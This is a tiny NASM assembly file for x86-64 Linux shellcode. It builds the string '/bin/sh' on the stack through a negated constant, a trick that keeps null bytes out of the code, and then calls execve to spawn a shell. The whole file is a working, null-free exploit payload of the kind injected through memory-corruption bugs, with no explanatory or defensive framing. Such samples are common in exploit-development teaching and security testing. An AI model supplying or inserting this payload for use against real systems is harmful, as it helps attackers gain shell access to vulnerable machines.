BITS 64

global _start

section .text

_start:
  mov rbx, 0xFF978CD091969DD1
  neg rbx
  push rbx
  xor eax, eax
  cdq
  xor esi, esi
  push rsp
  pop rdi
  mov al, 0x3b  ; sys_execve
  syscall
